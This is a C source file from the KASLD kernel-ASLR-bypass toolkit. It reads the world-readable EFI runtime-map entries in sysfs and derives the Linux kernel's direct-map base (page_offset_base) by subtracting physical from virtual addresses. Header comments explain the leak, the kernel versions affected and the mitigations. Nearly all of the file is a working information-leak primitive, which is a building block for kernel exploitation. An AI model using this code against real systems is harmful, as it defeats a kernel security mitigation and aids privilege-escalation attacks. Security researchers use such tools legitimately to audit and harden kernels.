// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read EFI runtime service virtual and physical addresses from
// /sys/firmware/efi/runtime-map/. Each numbered entry exposes five
// DEVICE_ATTR_RO (0444) sysfs files: phys_addr, virt_addr, num_pages,
// attribute, and type. No capability check; world-readable.
//
// On kernels without a dedicated EFI virtual address space (pre-~v5.14),
// the virtual addresses passed to SetVirtualAddressMap() are placed in the
// main kernel direct-map region. Subtracting the physical address from the
// virtual address yields page_offset_base directly, bounding the
// direct-map base to KASLR granularity.
//
// On v5.14+ kernels with a dedicated EFI page table (CONFIG_EFI_MIXED),
// the EFI VA space is separate from the kernel direct-map; virt_addr no
// longer falls in the expected direct-map range and this technique is
// ineffective.
//
// Leak primitive:
//   Data leaked:      EFI runtime service virtual and physical addresses
//   Kernel subsystem: drivers/firmware/efi/runtime-map.c
//   Data structure:   EFI memory map descriptors (efi_memory_desc_t)
//   Address type:     virtual (direct-map, pre-v5.14)
//   Method:           parsed (sysfs text files)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (DEVICE_ATTR_RO, mode 0444)
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/drivers/firmware/efi/runtime-map.c
//
// Mitigations:
//   None at runtime. World-readable; no sysctl restricts access.
//   Utility reduced on v5.14+ kernels with dedicated EFI VA space.
//   CONFIG_EFI=n removes the sysfs entries entirely.
//
// Requires:
// - CONFIG_EFI
// - CONFIG_KEXEC_CORE (enables CONFIG_EFI_RUNTIME_MAP which creates the sysfs
//   directory; absent on stripped/virt kernels that omit kexec support)
// - UEFI-booted system (/sys/firmware/efi/runtime-map/ must exist)
//
// References:
// https://elixir.bootlin.com/linux/v6.12/source/drivers/firmware/efi/runtime-map.c
// https://www.kernel.org/doc/Documentation/ABI/testing/sysfs-firmware-efi-runtime-map
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads EFI runtime service virtual and physical addresses from "
    "/sys/firmware/efi/runtime-map/N/virt_addr and /phys_addr. On "
    "kernels without a dedicated EFI virtual address space (pre-~v5.14), "
    "runtime service virtual addresses are placed in the kernel "
    "direct-map. Subtracting phys_addr from virt_addr yields "
    "page_offset_base directly. Files are world-readable (DEVICE_ATTR_RO, "
    "0444); requires CONFIG_EFI and a UEFI-booted system.");

// Untested: no suitable EFI system available for testing.
KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "status:experimental\n"
           "config:CONFIG_EFI\n"
           "config:CONFIG_KEXEC_CORE\n");

static int read_file_line(const char *path, char *buf, size_t len) {
  FILE *f = fopen(path, "r");
  if (!f)
    return -1;
  if (fgets(buf, (int)len, f) == NULL) {
    fclose(f);
    return -1;
  }
  fclose(f);
  buf[strcspn(buf, "\n")] = '\0';
  return 0;
}

int main(void) {
  const char *base = "/sys/firmware/efi/runtime-map";
  DIR *d;
  struct dirent *ent;
  char path[512];
  char buf[64];
  int count = 0;

  printf("[.] searching %s for EFI runtime service virtual addresses ...\n",
         base);

  d = opendir(base);
  if (!d) {
    int e = errno;
    perror("[-] opendir");
    return (e == EACCES || e == EPERM) ? KASLD_EXIT_NOPERM
                                       : KASLD_EXIT_UNAVAILABLE;
  }

  while ((ent = readdir(d)) != NULL) {
    if (ent->d_name[0] == '.')
      continue;

    snprintf(path, sizeof(path), "%s/%s/virt_addr", base, ent->d_name);
    if (read_file_line(path, buf, sizeof(buf)) < 0)
      continue;

    char *endptr;
    unsigned long virt = strtoul(buf, &endptr, 16);
    if (!virt || endptr == buf)
      continue;

    /* Must be in the direct-map region: at or above PAGE_OFFSET, below
     * kernel text. Rejects physical-range values on systems where
     * SetVirtualAddressMap was never called or used identity mapping. */
    if (virt < PAGE_OFFSET || virt >= KERNEL_BASE_MIN)
      continue;

    snprintf(path, sizeof(path), "%s/%s/phys_addr", base, ent->d_name);
    if (read_file_line(path, buf, sizeof(buf)) < 0) {
      printf("EFI runtime entry %s: virt=0x%016lx\n", ent->d_name, virt);
      kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                   KASLD_REGION_DIRECTMAP, NULL);
      count++;
      continue;
    }

    unsigned long phys = strtoul(buf, &endptr, 16);
    if (endptr == buf || phys > virt) {
      printf("EFI runtime entry %s: virt=0x%016lx\n", ent->d_name, virt);
      kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                   KASLD_REGION_DIRECTMAP, NULL);
      count++;
      continue;
    }

    /* page_offset_base = virt - phys for any direct-map entry */
    unsigned long page_offset = virt - phys;
    if (page_offset < KERNEL_VAS_START || page_offset >= KERNEL_BASE_MIN)
      continue;

    printf("EFI runtime entry %s: virt=0x%016lx phys=0x%016lx"
           " => page_offset=0x%016lx\n",
           ent->d_name, virt, phys, page_offset);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, page_offset,
                 KASLD_REGION_PAGE_OFFSET, NULL);
    count++;
  }
  closedir(d);

  if (!count) {
    printf("[-] no EFI runtime map entries with direct-map virtual addresses"
           " found\n");
    return 0;
  }

  return 0;
}
